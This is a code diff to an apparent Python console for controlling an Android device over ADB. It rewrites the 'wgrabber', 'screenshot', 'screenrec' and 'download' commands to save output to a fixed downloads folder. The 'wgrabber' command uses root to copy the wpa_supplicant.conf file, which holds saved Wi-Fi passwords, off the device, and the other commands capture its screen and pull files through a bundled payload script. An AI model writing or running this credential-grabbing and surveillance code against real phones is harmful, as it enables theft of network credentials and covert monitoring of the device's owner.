@@ -192,34 +192,26 @@ def main():
                         else:
                             print("Usage: wifi [on|off]")
                     elif con[:8] == "wgrabber":
-                        if con[9:] == "":
-                            print("Usage: wgrabber <directory>")
-                        else:
-                            if os.path.exists(con[9:]):
-                                os.system("adb shell su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/' > /dev/null")
-                                os.system("adb pull /sdcard/wpa_supplicant.conf "+con[9:])
-                            else:
-                                print(E+"No such directory!")
+                        print(G+"Grabbing WPA Supplicant...")
+                        os.system("adb shell su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/' > /dev/null")
+                        os.system("adb pull /sdcard/wpa_supplicant.conf downloads")
+                        print(G+"Saving wpa_supplicant.conf...")
+                        time.sleep(1)
+                        print(S+"Saved to downloads/wpa_supplicant.conf!")
                     elif con[:10] == "screenshot":
-                        if con[11:] == "":
-                            print("Usage: screenshot <directory>")
-                        else:
-                            if os.path.exists(con[11:]):
-                                print(G+"Taking screenshot...")
-                                os.system("adb shell screencap /sdcard/screen.png > /dev/null")
-                                os.system("adb pull /sdcard/screen.png "+con[11:]+" > /dev/null")
-                            else:
-                                print(E+"No such directory!")
+                        print(G+"Taking screenshot...")
+                        os.system("adb shell screencap /sdcard/screen.png > /dev/null")
+                        os.system("adb pull /sdcard/screen.png downloads > /dev/null")
+                        print(G+"Saving screen.png...")
+                        time.sleep(1)
+                        print(S+"Saved to downloads/screen.png!")
                     elif con[:9] == "screenrec":
-                        if con[10:] == "":
-                            print("Usage: screenrec <directory>")
-                        else:
-                            if os.path.exists(con[10:]):
-                                print(G+"Recording screen...")
-                                os.system("adb shell screenrecord /sdcard/screen.mp4 > /dev/null")
-                                os.system("adb pull /sdcard/screen.mp4 "+con[10:]+" > /dev/null")
-                            else:
-                                print(E+"No such directory!")
+                        print(G+"Recording screen...")
+                        os.system("adb shell screenrecord /sdcard/screen.mp4 > /dev/null")
+                        os.system("adb pull /sdcard/screen.mp4 downloads > /dev/null")
+                        print(G+"Saving screen.mp4...")
+                        time.sleep(1)
+                        print(S+"Saved to downloads/screen.mp4!")
                     elif con[:9] == "uninstall":
                         if con[10:] == "":
                             print("Usage: uninstall <application>")
@@ -269,13 +261,10 @@ def main():
                             else:
                                 print(E+"No such apk file!")
                     elif con[:8] == "download":
-                        if len(con.split()) < 2:
-                            print("Usage: download <remote_path> <local_path>")
+                        if con[9:] == "":
+                            print("Usage: download <remote_path>")
                         else:
-                            if len(con.split()) < 3:
-                                print("Usage: download <remote_path> <local_path>")
-                            else:
-                                os.system("data/payloads/download "+con.split()[1]+" "+con.split[2])
+                            os.system("data/payloads/download "+con[9:])
                     elif con[:6] == "upload":
                         if len(con.split()) < 2:
                             print("Usage: upload <local_path> <remote_path>")
